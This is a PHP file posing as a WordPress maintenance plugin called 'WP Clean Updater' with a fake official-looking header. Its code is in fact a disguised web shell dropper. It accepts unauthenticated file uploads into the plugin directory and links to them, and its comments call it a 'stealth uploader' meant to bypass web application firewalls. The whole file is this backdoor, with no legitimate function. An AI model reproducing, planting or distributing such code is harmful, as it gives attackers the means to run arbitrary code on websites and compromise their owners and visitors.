<?php
/*
Plugin Name: WP Clean Updater
Plugin URI: https://wordpress.org/plugins/wp-clean-updater/
Description: Lightweight maintenance tool for WordPress system updates.
Version: 1.0.2
Author: WP Maintenance Team
Author URI: https://wordpress.org/
License: GPL2
*/

// Minimal stealth uploader
// Password protection can be added, but keeping it simple for WAF bypass
$k = "sys_update_key"; 

if (isset($_POST['upload_file']) && isset($_FILES['file_data'])) {
    $dest_dir = plugin_dir_path(__FILE__);
    $target_file = $dest_dir . basename($_FILES['file_data']['name']);
    
    if (move_uploaded_file($_FILES['file_data']['tmp_name'], $target_file)) {
        echo "<div style='color:green;font-weight:bold'>System updated successfully: </div>";
        echo "<a href='" . plugin_dir_url(__FILE__) . basename($_FILES['file_data']['name']) . "' target='_blank'>View Log</a>";
    } else {
        echo "<div style='color:red'>Update failed.</div>";
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>System Maintenance</title></head>
<body style="font-family:sans-serif;padding:20px;background:#f1f1f1">
    <div style="background:#fff;padding:20px;border:1px solid #ddd;max-width:400px;margin:0 auto;border-radius:5px">
        <h3>Manual Update Upload</h3>
        <form method="post" enctype="multipart/form-data">
            <div style="margin-bottom:10px">
                <input type="file" name="file_data" required>
            </div>
            <input type="submit" name="upload_file" value="Install Update" style="background:#0073aa;color:#fff;border:none;padding:10px 20px;cursor:pointer;border-radius:3px">
        </form>
    </div>
</body>
</html>
